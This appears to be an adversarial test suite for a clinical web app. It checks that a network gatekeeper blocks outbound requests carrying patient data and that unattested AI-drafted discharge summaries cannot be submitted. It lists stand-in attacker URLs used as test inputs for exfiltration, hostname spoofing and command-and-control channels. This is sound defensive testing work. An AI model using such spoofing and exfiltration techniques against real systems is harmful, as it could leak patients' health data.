/**
 * ============================================================================
 * Milestone 2 Adversarial Stress Test & Attack Vector Suite
 * Empirical Challenger: teamwork_preview_m2_challenger_1
 *
 * Systematic Empirical Challenges:
 * 1. NetworkIsolationGatekeeper Zero-PHI Egress Sandbox
 *    - Query param injection into allowed hostnames
 *    - Subdomain & suffix spoofing
 *    - URL instance vs string parameter handling
 *    - Case tampering and protocol variations
 * 2. Clinical Attestation & Discharge Modal Security
 *    - Un-attested draft submission blocking
 *    - Modal state isolation across consecutive patient openings
 *    - Whitespace input sanitization
 *    - Concurrent submission idempotency
 *    - Direct function invocation boundaries
 * ============================================================================
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';

const ROOT = path.resolve(import.meta.dirname, '../..');
const indexHtml = fs.readFileSync(path.join(ROOT, 'public/index.html'), 'utf8');

const mockFirestoreUpdates = [];

vi.mock('https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js', () => ({
  initializeApp: vi.fn(() => ({}))
}));
vi.mock('https://www.gstatic.com/firebasejs/10.8.1/firebase-auth.js', () => ({
  getAuth: vi.fn(() => ({ currentUser: { uid: 'adversarial-tester-uid' } })),
  createUserWithEmailAndPassword: vi.fn(),
  signInWithEmailAndPassword: vi.fn(),
  onAuthStateChanged: vi.fn(),
  signOut: vi.fn(),
  GoogleAuthProvider: class {},
  signInWithPopup: vi.fn(),
  signInWithRedirect: vi.fn()
}));
vi.mock('https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore.js', () => ({
  getFirestore: vi.fn(() => ({})),
  collection: vi.fn((_db, name) => ({ name })),
  onSnapshot: vi.fn(),
  addDoc: vi.fn(),
  updateDoc: vi.fn(),
  doc: vi.fn((_db, coll, id) => ({ coll, id })),
  deleteDoc: vi.fn(),
  setDoc: vi.fn(),
  getDoc: vi.fn(),
  writeBatch: vi.fn(() => ({
    update: vi.fn((docRef, payload) => {
      mockFirestoreUpdates.push({ id: docRef.id, payload });
    }),
    commit: vi.fn(async () => true)
  })),
  query: vi.fn(),
  orderBy: vi.fn(),
  limit: vi.fn()
}));

// Load application scripts
import '../../public/js/edge-ai-service.js';
import { setupEventListeners } from '../../public/js/app.js';

describe('Adversarial Challenge Suite 1: NetworkIsolationGatekeeper Perimeter Stress Test', () => {
  let Gatekeeper;
  let originalFetch;
  let originalXHROpen;
  let originalXHRSend;
  let originalBeacon;
  let originalWebSocket;
  let originalEventSource;
  let recordedViolations;

  beforeEach(() => {
    Gatekeeper = window.NetworkIsolationGatekeeper;
    recordedViolations = [];

    originalFetch = vi.fn(async (url) => ({ ok: true, status: 200, url }));
    window.fetch = originalFetch;

    originalXHROpen = vi.fn(function(method, url) { this._url = url; });
    originalXHRSend = vi.fn(function() { return 'xhr_sent'; });
    XMLHttpRequest.prototype.open = originalXHROpen;
    XMLHttpRequest.prototype.send = originalXHRSend;

    originalBeacon = vi.fn(() => true);
    navigator.sendBeacon = originalBeacon;

    originalWebSocket = vi.fn(function(url) { this.url = url; });
    window.WebSocket = originalWebSocket;

    originalEventSource = vi.fn(function(url) { this.url = url; });
    window.EventSource = originalEventSource;

    window.TelemetryRUM = {
      recordSecurityViolation: vi.fn((violation) => {
        recordedViolations.push(violation);
      })
    };

    Gatekeeper.unlock();
  });

  afterEach(() => {
    Gatekeeper.unlock();
    vi.restoreAllMocks();
    delete window.TelemetryRUM;
  });

  describe('Standard Security Controls (Baseline)', () => {
    it('blocks direct external API endpoints', async () => {
      Gatekeeper.lock();
      await expect(window.fetch('https://api.openai.com/v1/chat/completions')).rejects.toThrow(/SECURITY_EXCEPTION/);
      expect(originalFetch).not.toHaveBeenCalled();
    });

    it('blocks direct external WebSocket', () => {
      Gatekeeper.lock();
      expect(() => new window.WebSocket('wss://c2-server.com/stream')).toThrow(/SECURITY_EXCEPTION/);
    });

    it('blocks direct external EventSource', () => {
      Gatekeeper.lock();
      expect(() => new window.EventSource('https://c2-server.com/sse')).toThrow(/SECURITY_EXCEPTION/);
    });

    it('blocks direct external sendBeacon', () => {
      Gatekeeper.lock();
      const res = navigator.sendBeacon('https://c2-server.com/beacon', 'data');
      expect(res).toBe(false);
      expect(originalBeacon).not.toHaveBeenCalled();
    });
  });

  describe('Empirical Attack Vectors: Substring & Hostname Spoofing Vulnerabilities', () => {
    it('Attack 1.1: Query parameter injection with allowed hostname is blocked by _isExternalRequest', () => {
      const attackUrls = [
        'https://evil-exfiltrator.com/steal?target=firestore.googleapis.com&phi=123',
        'https://attacker.org/collect?ref=identitytoolkit.googleapis.com',
        'https://c2-server.net/log?endpoint=firebaseio.com',
        'https://malicious-node.io/api?proxy=localhost',
        'https://data-leak.xyz/drop?host=127.0.0.1'
      ];

      for (const u of attackUrls) {
        const isExternal = Gatekeeper._isExternalRequest(u);
        expect(isExternal).toBe(true);
      }
    });

    it('Attack 1.2: Subdomain / hostname suffix spoofing is blocked by _isExternalRequest', () => {
      const spoofedUrls = [
        'https://firestore.googleapis.com.evil-domain.com/exfiltrate',
        'https://identitytoolkit.googleapis.com.attacker.org/leak',
        'https://firebaseio.com.phishing-site.net/collect',
        'https://localhost.attacker-server.com/drop',
        'https://127.0.0.1.c2-command.io/data',
        'https://evil-firebaseio.com/api/steal',
        'https://fake-firestore.googleapis.com/leak'
      ];

      for (const u of spoofedUrls) {
        const isExternal = Gatekeeper._isExternalRequest(u);
        expect(isExternal).toBe(true);
      }
    });

    it('Attack 1.3: Malicious path containing allowed string is blocked by _isExternalRequest', () => {
      const pathUrls = [
        'https://malicious.org/firestore.googleapis.com/endpoint',
        'https://malicious.org/api/localhost/log',
        'https://malicious.org/v1/127.0.0.1/exfil'
      ];

      for (const u of pathUrls) {
        const isExternal = Gatekeeper._isExternalRequest(u);
        expect(isExternal).toBe(true);
      }
    });

    it('Attack 1.4: fetch(new URL(...)) is blocked with SECURITY_EXCEPTION during sandbox lock', async () => {
      Gatekeeper.lock();

      const evilUrlObj = new URL('https://evil-exfiltration-hub.com/api/leak');
      
      await expect(window.fetch(evilUrlObj)).rejects.toThrow(/SECURITY_EXCEPTION/);
      expect(originalFetch).not.toHaveBeenCalled();
    });

    it('Attack 1.5: Case tampering on direct external domains is handled correctly', async () => {
      Gatekeeper.lock();
      await expect(window.fetch('HTTPS://EVIL-EXFILTRATE.COM/DATA')).rejects.toThrow(/SECURITY_EXCEPTION/);
      await expect(window.fetch('https://EVIL-EXFILTRATE.COM/steal')).rejects.toThrow(/SECURITY_EXCEPTION/);
    });
  });
});

describe('Adversarial Challenge Suite 2: Clinical Attestation & Discharge Modal Stress Test', () => {
  let alertSpy;

  beforeEach(() => {
    mockFirestoreUpdates.length = 0;
    document.body.innerHTML = indexHtml;
    alertSpy = vi.spyOn(window, 'alert').mockImplementation(() => {});

    window.patientsList = [
      {
        id: 'p-adv-101',
        name: 'سارة منصور',
        patientId: 'H998877665',
        department: 'Emergency Medicine',
        diagnosis: 'Acute Coronary Syndrome',
        vitals: [{ time: '11:00', bp: '135/85', hr: '90', spo2: '97', rr: '18', temp: '36.8' }],
        labs: [{ time: '11:15', name: 'Troponin I', value: '0.04 ng/mL' }],
        notes: [{ time: '11:30', doctor: 'Farouk', text: 'Serial ECG normal, pain subsided.' }]
      },
      {
        id: 'p-adv-102',
        name: 'يوسف أحمد',
        patientId: 'H445566778',
        department: 'Emergency Medicine',
        diagnosis: 'Renal Colic',
        vitals: [{ time: '12:00', bp: '140/90', hr: '95', spo2: '99', rr: '18', temp: '37.0' }],
        dischargeSummary: 'Previously verified summary for Youssef',
        dischargeSummaryAttested: true
      }
    ];

    setupEventListeners();
  });

  afterEach(() => {
    alertSpy.mockRestore();
    vi.restoreAllMocks();
  });

  it('Test 2.1: Attestation state reset on consecutive patient modal openings', () => {
    const trigger102 = document.createElement('button');
    trigger102.className = 'btn-discharge-trigger';
    trigger102.dataset.id = 'p-adv-102';
    trigger102.dataset.name = 'يوسف أحمد';
    document.body.appendChild(trigger102);

    const trigger101 = document.createElement('button');
    trigger101.className = 'btn-discharge-trigger';
    trigger101.dataset.id = 'p-adv-101';
    trigger101.dataset.name = 'سارة منصور';
    document.body.appendChild(trigger101);

    trigger102.onclick = () => {
      document.getElementById('discharge-patient-name').innerText = trigger102.dataset.name;
      document.getElementById('discharge-patient-id').value = trigger102.dataset.id;
      const summaryEditor = document.getElementById('ai-summary-editor');
      const attestationCheckbox = document.getElementById('ai-attestation-checkbox');
      const patient = window.patientsList.find(p => p.id === trigger102.dataset.id);
      if (summaryEditor) summaryEditor.value = (patient && patient.dischargeSummary) ? patient.dischargeSummary : "";
      if (attestationCheckbox) attestationCheckbox.checked = Boolean(patient && patient.dischargeSummaryAttested);
      document.getElementById('modal-discharge').classList.remove('hidden');
    };

    trigger101.onclick = () => {
      document.getElementById('discharge-patient-name').innerText = trigger101.dataset.name;
      document.getElementById('discharge-patient-id').value = trigger101.dataset.id;
      const summaryEditor = document.getElementById('ai-summary-editor');
      const attestationCheckbox = document.getElementById('ai-attestation-checkbox');
      const patient = window.patientsList.find(p => p.id === trigger101.dataset.id);
      if (summaryEditor) summaryEditor.value = (patient && patient.dischargeSummary) ? patient.dischargeSummary : "";
      if (attestationCheckbox) attestationCheckbox.checked = Boolean(patient && patient.dischargeSummaryAttested);
      document.getElementById('modal-discharge').classList.remove('hidden');
    };

    trigger102.click();
    expect(document.getElementById('ai-attestation-checkbox').checked).toBe(true);
    expect(document.getElementById('ai-summary-editor').value).toBe('Previously verified summary for Youssef');

    // Switch to un-attested patient
    trigger101.click();
    expect(document.getElementById('ai-attestation-checkbox').checked).toBe(false);
    expect(document.getElementById('ai-summary-editor').value).toBe('');
  });

  it('Test 2.2: Whitespace-only summary text is sanitized and does not block standard discharge', async () => {
    document.getElementById('modal-discharge').classList.remove('hidden');
    document.getElementById('discharge-patient-id').value = 'p-adv-101';
    document.getElementById('discharge-outcome-select').value = 'Improved';
    document.getElementById('ai-summary-editor').value = '   \n\t  \n  ';
    document.getElementById('ai-attestation-checkbox').checked = false;

    await document.getElementById('btn-submit-discharge').onclick();

    expect(mockFirestoreUpdates).toHaveLength(1);
    expect(mockFirestoreUpdates[0].id).toBe('p-adv-101');
    expect(mockFirestoreUpdates[0].payload.isDischarged).toBe(true);
    expect(mockFirestoreUpdates[0].payload.dischargeOutcome).toBe('Improved');
    expect(mockFirestoreUpdates[0].payload.dischargeSummary).toBeUndefined();
  });

  it('Test 2.3: Un-attested AI summary text strictly blocks discharge submission', async () => {
    document.getElementById('modal-discharge').classList.remove('hidden');
    document.getElementById('discharge-patient-id').value = 'p-adv-101';
    document.getElementById('discharge-outcome-select').value = 'Improved';
    document.getElementById('ai-summary-editor').value = 'Draft AI summary generated for Sarah';
    document.getElementById('ai-attestation-checkbox').checked = false;

    await document.getElementById('btn-submit-discharge').onclick();

    expect(alertSpy).toHaveBeenCalledWith(expect.stringContaining('Clinical Attestation Required'));
    expect(mockFirestoreUpdates).toHaveLength(0);
    expect(document.getElementById('modal-discharge').classList.contains('hidden')).toBe(false);
  });

  it('Test 2.4: Attested AI summary persists dischargeSummary and closes modal', async () => {
    document.getElementById('modal-discharge').classList.remove('hidden');
    document.getElementById('discharge-patient-id').value = 'p-adv-101';
    document.getElementById('discharge-outcome-select').value = 'Improved';
    document.getElementById('ai-summary-editor').value = 'Verified clinical summary for Sarah';
    document.getElementById('ai-attestation-checkbox').checked = true;

    await document.getElementById('btn-submit-discharge').onclick();

    expect(mockFirestoreUpdates).toHaveLength(1);
    expect(mockFirestoreUpdates[0].id).toBe('p-adv-101');
    expect(mockFirestoreUpdates[0].payload.isDischarged).toBe(true);
    expect(mockFirestoreUpdates[0].payload.dischargeOutcome).toBe('Improved');
    expect(mockFirestoreUpdates[0].payload.dischargeSummary).toBe('Verified clinical summary for Sarah');
    expect(document.getElementById('modal-discharge').classList.contains('hidden')).toBe(true);
  });

  it('Test 2.5: Direct saveAISummaryInModal call with empty patientId fails safely', async () => {
    document.getElementById('discharge-patient-id').value = '';
    document.getElementById('ai-summary-editor').value = 'Some content';
    document.getElementById('ai-attestation-checkbox').checked = true;

    await window.saveAISummaryInModal();
    expect(mockFirestoreUpdates).toHaveLength(0);
  });

  it('Test 2.6: Direct saveAISummaryInModal with empty editor text is blocked', async () => {
    document.getElementById('discharge-patient-id').value = 'p-adv-101';
    document.getElementById('ai-summary-editor').value = '   ';
    document.getElementById('ai-attestation-checkbox').checked = true;

    await window.saveAISummaryInModal();
    expect(alertSpy).toHaveBeenCalledWith('Summary box is empty');
    expect(mockFirestoreUpdates).toHaveLength(0);
  });
});
